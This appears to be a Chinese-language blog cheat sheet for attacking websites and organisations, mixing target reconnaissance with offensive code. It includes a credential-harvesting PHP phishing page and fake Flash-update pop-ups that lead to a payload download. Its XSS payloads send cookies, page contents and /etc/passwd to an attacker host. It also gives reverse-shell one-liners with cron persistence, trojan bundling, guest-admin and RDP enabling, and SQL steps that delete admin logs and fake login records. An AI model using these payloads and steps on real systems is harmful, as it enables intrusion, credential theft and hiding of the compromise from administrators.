+<h6 id="随手测试"><a href="#随手测试" class="headerlink" title="随手测试"></a>随手测试</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">单引号</span><br><span class="line">xx.jpg/.php</span><br><span class="line">admin/123456</span><br><span class="line">万能密码</span><br><span class="line">Heartbleed漏洞</span><br></pre></td></tr></table></figure>
+
+<h6 id="Shodan-x2F-fofa-x2F-zoomeye"><a href="#Shodan-x2F-fofa-x2F-zoomeye" class="headerlink" title="Shodan&#x2F;fofa&#x2F;zoomeye"></a>Shodan&#x2F;fofa&#x2F;zoomeye</h6><h6 id="Google-语法"><a href="#Google-语法" class="headerlink" title="Google 语法"></a>Google 语法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Site,filetype,intitle,inurl,intext等</span><br></pre></td></tr></table></figure>
+
+<h6 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">电话、邮箱，姓名</span><br><span class="line">目录遍历</span><br><span class="line">备份文件</span><br><span class="line">  (www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip)</span><br><span class="line">.svn/.git/sql/robots/crossdomin.xml/DS_Store等</span><br><span class="line">  https://github.com/lijiejie/ds_store_exp</span><br><span class="line">  https://github.com/admintony/svnExploit</span><br><span class="line">若是论坛ID=1的用户名一般为管理、或查看帖子信息、生成字典</span><br><span class="line">网页上客服的QQ(先判断是企业的还是个人，用处有时不太大，看怎么用，搞个鱼叉什么的)</span><br></pre></td></tr></table></figure>
+
+<h6 id="网页缓存"><a href="#网页缓存" class="headerlink" title="网页缓存"></a>网页缓存</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.cachedpages.com/</span><br></pre></td></tr></table></figure>
+
+<h6 id="图片反查"><a href="#图片反查" class="headerlink" title="图片反查"></a>图片反查</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度识图、googleimage、tineye</span><br><span class="line">原图查询坐标</span><br></pre></td></tr></table></figure>
+
+<h6 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛</span><br><span class="line">外网信息</span><br><span class="line">有些人喜欢把自己的生活传到外网</span><br><span class="line">  推特、ins、fb等</span><br></pre></td></tr></table></figure>
+
+<h6 id="手机号加入通讯录匹配各个APP用户信息"><a href="#手机号加入通讯录匹配各个APP用户信息" class="headerlink" title="手机号加入通讯录匹配各个APP用户信息"></a>手机号加入通讯录匹配各个APP用户信息</h6><h6 id="注册过的网站"><a href="#注册过的网站" class="headerlink" title="注册过的网站"></a>注册过的网站</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.reg007.com/</span><br><span class="line">https://www.usersearch.org/</span><br></pre></td></tr></table></figure>
+
+<h6 id="目标人员的兴趣"><a href="#目标人员的兴趣" class="headerlink" title="目标人员的兴趣"></a>目标人员的兴趣</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标人员的兴趣 注册过的小众论坛，站点</span><br><span class="line">针对此类站点的深入</span><br><span class="line">收集到的用户名，电话等信息生成字典</span><br></pre></td></tr></table></figure>
+
+<h6 id="邮箱搜集"><a href="#邮箱搜集" class="headerlink" title="邮箱搜集"></a>邮箱搜集</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://hunter.io/</span><br><span class="line">https://github.com/killswitch-GUI/SimplyEmail</span><br></pre></td></tr></table></figure>
+
+<h6 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/dafthack/MailSniper</span><br></pre></td></tr></table></figure>
+
+<h6 id="验证邮箱是否存在"><a href="#验证邮箱是否存在" class="headerlink" title="验证邮箱是否存在"></a>验证邮箱是否存在</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tools.verifyemailaddress.io/</span><br></pre></td></tr></table></figure>
+
+<h6 id="历史泄露过的资料等"><a href="#历史泄露过的资料等" class="headerlink" title="历史泄露过的资料等"></a>历史泄露过的资料等</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">库</span><br><span class="line">https://haveibeenpwned.com/</span><br><span class="line">https://github.com/kernelmachine/haveibeenpwned</span><br></pre></td></tr></table></figure>
+
+<h6 id="Github-x2F-Gitee等代码托管平台"><a href="#Github-x2F-Gitee等代码托管平台" class="headerlink" title="Github&#x2F;Gitee等代码托管平台"></a>Github&#x2F;Gitee等代码托管平台</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/dxa4481/truffleHog</span><br><span class="line">https://github.com/lijiejie/GitHack</span><br><span class="line">https://github.com/MiSecurity/x-patrol</span><br><span class="line">https://github.com/az0ne/Github_Nuggests</span><br><span class="line">https://github.com/mazen160/GithubCloner克隆用户的github</span><br></pre></td></tr></table></figure>
+
+<h6 id="被入侵网址列表"><a href="#被入侵网址列表" class="headerlink" title="被入侵网址列表"></a>被入侵网址列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://zone-h.org/archive</span><br><span class="line">wooyun镜像查找目标企业曾出现的漏洞</span><br></pre></td></tr></table></figure>
+
+<h6 id="GPS查询"><a href="#GPS查询" class="headerlink" title="GPS查询"></a>GPS查询</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.opengps.cn/Default.aspx</span><br></pre></td></tr></table></figure>
+
+<h6 id="网站URL提取"><a href="#网站URL提取" class="headerlink" title="网站URL提取"></a>网站URL提取</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bulkdachecker.com/url-extractor/</span><br></pre></td></tr></table></figure>
+
+<h6 id="蜜罐判断-参考一下即可"><a href="#蜜罐判断-参考一下即可" class="headerlink" title="蜜罐判断(参考一下即可)"></a>蜜罐判断(参考一下即可)</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://honeyscore.shodan.io/</span><br></pre></td></tr></table></figure>
+
+<h6 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://default-password.info/</span><br><span class="line">http://routerpasswords.com</span><br></pre></td></tr></table></figure>
+
+<h6 id="如需注册"><a href="#如需注册" class="headerlink" title="如需注册"></a>如需注册</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Sms</span><br><span class="line">  https://www.materialtools.com/</span><br><span class="line">  http://receivefreesms.com/</span><br><span class="line">Email</span><br><span class="line">  https://10minutemail.net/</span><br><span class="line">  https://zh.mytrashmailer.com/</span><br><span class="line">  http://24mail.chacuo.net/enus</span><br><span class="line">  https://www.linshiyouxiang.net/</span><br><span class="line">Fake id</span><br><span class="line">  https://www.fakenamegenerator.com/</span><br><span class="line">  http://www.haoweichi.com/</span><br><span class="line">  https://www.fakeaddressgenerator.com/</span><br></pre></td></tr></table></figure>
+
+<h6 id="企业信息"><a href="#企业信息" class="headerlink" title="企业信息"></a>企业信息</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">天眼查、企查查、企业信用信息公示系统</span><br><span class="line">企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计</span><br></pre></td></tr></table></figure>
+
+<h4 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h4><h5 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h5><h6 id="XSS克隆钓鱼"><a href="#XSS克隆钓鱼" class="headerlink" title="XSS克隆钓鱼"></a>XSS克隆钓鱼</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">保存js&amp;css到服务器，登录action改为接受密码的文件action=&quot;./pass.php&quot;</span><br><span class="line">&lt;?php //php</span><br><span class="line">  $user=$_POST[&#x27;username&#x27;];</span><br><span class="line">  $pass=$_POST[&#x27;password&#x27;];</span><br><span class="line">  $file=fopen(&#x27;pass.txt&#x27;,&#x27;a+&#x27;);</span><br><span class="line">  fwrite($file,$user.&quot;|&quot;.&quot;pass&quot; . &quot;\n&quot;);</span><br><span class="line">  fclose($file);</span><br><span class="line">  echo &quot;&lt;script&gt;window.location.href=\&quot;http://192.168.0.1\&quot;&lt;/script&gt;\n&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">构造payload</span><br><span class="line">&lt;script&gt;window.location.href=&quot;http://192.168.0.1/login.html&quot;&lt;/script&gt;</span><br><span class="line">php –S 0.0.0.0:8080 –t ./</span><br></pre></td></tr></table></figure>
+
+<h6 id="伪造页面钓鱼"><a href="#伪造页面钓鱼" class="headerlink" title="伪造页面钓鱼"></a>伪造页面钓鱼</h6><p>1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/r00tSe7en/Fake-flash.cn</span><br><span class="line">添加xss平台模块</span><br><span class="line">window.alert = function(name)&#123;</span><br><span class="line">var iframe = document.createElement(&quot;IFRAME&quot;);</span><br><span class="line">iframe.style.display=&quot;none&quot;;</span><br><span class="line">iframe.setAttribute(&quot;src&quot;,&#x27;data:text/plain&#x27;);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line">window.frames[0].window.alert(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;您的FLASH版本过低，尝试升级后访问该页面！&quot;);</span><br><span class="line">window.location.href=&quot;http://www.flash.com&quot;;</span><br><span class="line">制作自解压捆绑</span><br><span class="line">一个马.exe，一个正常exe，全选，winrar添加到压缩文件，选择创建自解压格式压缩文件，高级-&gt;自解压选项，设置解压路径，c:\windows\temp\，设置-&gt;解压后运行两个exe文件，模式全部隐藏，更新，解压并更新文件，覆盖所有文件。</span><br><span class="line">ResourceHacker修改文件图标</span><br></pre></td></tr></table></figure>
+
+<p>2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(empty($_COOKIE[&#x27;flash&#x27;]))&#123;</span><br><span class="line">    echo &#x27;&lt;script&gt;alert(&quot;你当前计算机的Flash软件已经很久未更新，将导致无法正常显示界面内容，请下载安装最新版本！&quot;);window.location=&quot;http://www.flash.cn.xx.com/&quot;&lt;/script&gt;&#x27;;</span><br><span class="line">    setcookie(&quot;flash&quot;,&quot;true&quot;,time()+30*2400);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="对外服务攻击"><a href="#对外服务攻击" class="headerlink" title="对外服务攻击"></a>对外服务攻击</h5><h6 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h6><p>前端&#x2F;逻辑漏洞</p>
+<p>注册</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">任意用户注册</span><br><span class="line">可爆破用户名</span><br><span class="line">注入</span><br><span class="line">XSS</span><br></pre></td></tr></table></figure>
+
+<p>登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆破用户名，密码</span><br><span class="line">注入</span><br><span class="line">万能密码</span><br><span class="line">Xss</span><br><span class="line">Xss+Csrf</span><br><span class="line">修改返回包信息，登入他人账户</span><br><span class="line">修改cookie中的参数，如user,adminid等</span><br></pre></td></tr></table></figure>
+
+<p>任意密码重置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1．重置一个账户，不发送验证码，设置验证码为空发送请求。</span><br><span class="line">2．发送验证码，查看相应包</span><br><span class="line">3．验证码生存期的爆破</span><br><span class="line">4．修改相应包为成功的相应包</span><br><span class="line">5．手工直接跳转到校验成功的界面</span><br><span class="line">6．两个账户，重置别人密码时，替换验证码为自己正确的验证码</span><br><span class="line">7．重置别人密码时，替换为自己的手机号</span><br><span class="line">8．重置自己的成功时，同意浏览器重置别人的，不发验证码</span><br><span class="line">9．替换用户名，ID，cookie，token参数等验证身份的参数</span><br><span class="line">10．通过越权修改他人的找回信息如手机/邮箱来重置</span><br></pre></td></tr></table></figure>
+
+<p>信息泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTML源码、JS等查看信息搜集一章</span><br></pre></td></tr></table></figure>
+
+<p>后台</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">登录参数修改为注册参数/reg、/register、/sign等</span><br></pre></td></tr></table></figure>
+
+<p>JWT攻击手法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://jwt.io/#debugger-io</span><br></pre></td></tr></table></figure>
+
+<h5 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将原JWT串解码后修改用户名等身份认证的地方，生成新token发送请求</span><br></pre></td></tr></table></figure>
+
+<h5 id="xss相关"><a href="#xss相关" class="headerlink" title="xss相关"></a>xss相关</h5><h6 id="xss插入代码"><a href="#xss插入代码" class="headerlink" title="xss插入代码"></a>xss插入代码</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://ip或者域名/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="构造js弹窗钓鱼内容"><a href="#构造js弹窗钓鱼内容" class="headerlink" title="构造js弹窗钓鱼内容"></a>构造js弹窗钓鱼内容</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>. <span class="title function_">createElement</span>(<span class="string">&quot;IFRAME&quot;</span>);</span><br><span class="line">iframe.<span class="property">style</span>.<span class="property">display</span>=<span class="string">&quot;none&quot;</span>;</span><br><span class="line">iframe.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&#x27;data:text/plain,&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>. documentElement.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">frames</span> [<span class="number">0</span>].<span class="property">window</span>.<span class="title function_">alert</span>(name);</span><br><span class="line">iframe.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(iframe);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">alert</span>( <span class="string">&quot;您的FLASH版本过低，尝试升级后访问该页面! &quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>. location.<span class="property">href</span>=<span class="string">&quot;http://mw.51course.cn/ueditor/php/upload/file/flashplayer.zip&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>没有服务器可以上传到github上去</p>
+<h6 id="xss打COOKIE"><a href="#xss打COOKIE" class="headerlink" title="xss打COOKIE"></a>xss打COOKIE</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;javascript:document.location.href=(&#x27;http://xx.xx.xx.xx:7777?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">读取HTML</span><br><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://xx.xx.xx.xx:7777/?&#x27;+btoa(document.body.innerHTML)&quot;&gt;</span><br><span class="line">读文件</span><br><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">	if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">	&#123;</span><br><span class="line">		document.location=&#x27;http://xx.xx.xx.xx:7777/?&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;file.php&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&quot;&gt;</span><br><span class="line">XSS+SSRF读取服务器文件</span><br><span class="line"></span><br><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">&#123;</span><br><span class="line">    document.location=&#x27;http://vps_ip:23333/?&#x27;+btoa(xmlhttp.responseText);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///etc/passwd&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h5><h6 id="base64解码文件"><a href="#base64解码文件" class="headerlink" title="base64解码文件"></a>base64解码文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d 1.txt &gt;www.zip <span class="comment">##base64解码</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="php大马"><a href="#php大马" class="headerlink" title="php大马"></a>php大马</h5><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Kevil-hui/BestShell/master/best_php_shell.php">https://raw.githubusercontent.com/Kevil-hui/BestShell/master/best_php_shell.php</a></p>
+<h5 id="控制之后"><a href="#控制之后" class="headerlink" title="控制之后"></a>控制之后</h5><h6 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h6><p>Linux反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/vps的ip/4444 0&gt;&amp;1 <span class="comment">##反弹shell</span></span><br></pre></td></tr></table></figure>
+
+<p>每一分钟执行一次反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * sh -i &gt;&amp; /dev/tcp/vpsip/12666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>代理做跳板：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew <span class="literal">-s</span> rssocks <span class="literal">-d</span> vps的ip <span class="literal">-e</span> <span class="number">8888</span> <span class="comment">##被控制的主机</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew: ./ew -s rcsocks -l 1080 -e 8888 <span class="comment">##公网vps/控制机</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h6><p>查看以root运行的程序，竟然得到了宝塔的root数据库的密码</p>
+<p>root     21998  0.0  0.0 115408  1444 ?        S    May28   0:00 &#x2F;bin&#x2F;sh -c &#x2F;www&#x2F;server&#x2F;mysql&#x2F;bin&#x2F;mysql -uroot -p369d72160931b2e3 –force “2022” &lt; “&#x2F;www&#x2F;backup&#x2F;database&#x2F;111_20220528_161218.sql”</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep <span class="string">&quot;^root&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="rar打包命令"><a href="#rar打包命令" class="headerlink" title="rar打包命令"></a>rar打包命令</h6><p>rar.exe a -ag -k -r -s -ibck c:&#x2F;bak.rar c:&#x2F;dat&#x2F;</p>
+<h6 id="msf-windows-shell乱码解决"><a href="#msf-windows-shell乱码解决" class="headerlink" title="msf windows shell乱码解决"></a>msf windows shell乱码解决</h6><p>输入chcp 65001</p>
+<h6 id="guest开启3389"><a href="#guest开启3389" class="headerlink" title="guest开启3389"></a>guest开启3389</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user  guest  /active:yes                      <span class="comment">#激活guest用户</span></span><br><span class="line">net localgroup  administrators  guest  /add       <span class="comment">#将guest用户添加到administrators</span></span><br><span class="line">net user guest    密码                            <span class="comment">#更改guest用户密码</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f   <span class="comment">#开启3389端口</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><p>目前可进入目标网站后台和后续的渗透思路有以下一些：<br>1、修改后台登录入口嗅探登录的用户和密码；<br>2、通过加密算法生成密文字典进行撞库攻击；<br>3、通过加密算法生成密文后进入数据库修改；<br>4、XSS打Cookie或Flash水坑钓鱼等攻击方式；<br>5、APK中注入恶意程序，替换APK的下载地址；  </p>
+<h5 id="数据库的一些操作"><a href="#数据库的一些操作" class="headerlink" title="数据库的一些操作"></a>数据库的一些操作</h5><p>1、查询管理员用户：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `cmf_users` WHERE `user_login`=<span class="string">&#x27;B8V9nAV&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>2、查询多少用户在用这个密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `cmf_users` WHERE FIND_IN_SET(<span class="string">&#x27;###08e3756d043515f77e8de4f5deb00496&#x27;</span>,user_pass);</span><br></pre></td></tr></table></figure>
+<p>3、查询最近登录用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `cmf_users` ORDER BY last_login_time DESC;</span><br></pre></td></tr></table></figure>
+<p>4、修改管理员密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `cmf_users` SET `user_pass`=<span class="string">&#x27;###73b13b8b4d767f6c3c2953f123d1a721&#x27;</span> WHERE (`user_login`=<span class="string">&#x27;B8V9nAV&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>5、删除管理员日志并重新按ID进行排序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM `cmf_admin_log` WHERE (`<span class="built_in">id</span>`&gt;=<span class="string">&#x27;4175&#x27;</span>);ALTER TABLE cmf_admin_log AUTO_INCREMENT = 1;</span><br></pre></td></tr></table></figure>
+<p>6、恢复管理员密码并替换最后登录IP和时间：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `cmf_users` SET `user_pass`=<span class="string">&#x27;###08e3756d043515f77e8de4f5deb00496&#x27;</span>,`last_login_ip`=<span class="string">&#x27;122.60.22.247&#x27;</span>,`last_login_time`=<span class="string">&#x27;2020-07-23 05:41:06&#x27;</span> WHERE (`user_login`=<span class="string">&#x27;B8V9nAV&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="渗透后得到交互式的终端"><a href="#渗透后得到交互式的终端" class="headerlink" title="渗透后得到交互式的终端"></a>渗透后得到交互式的终端</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm 然后 Ctrl+Z 退出来一下</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>;<span class="built_in">fg</span> 回车后输入 reset 再回车</span><br><span class="line"><span class="built_in">stty</span> rows 46 columns 188</span><br></pre></td></tr></table></figure>
+<h5 id="渗透后打包网站源码导出数据库操作"><a href="#渗透后打包网站源码导出数据库操作" class="headerlink" title="渗透后打包网站源码导出数据库操作"></a>渗透后打包网站源码导出数据库操作</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf backend.tar /www/wwwroot/backend/</span><br><span class="line">mysqldump -h127.0.0.1 -uroot -proot --databases MH***hN | gzip &gt; backend.sql.gz</span><br><span class="line">gunzip backend.sql.gz</span><br></pre></td></tr></table></figure>
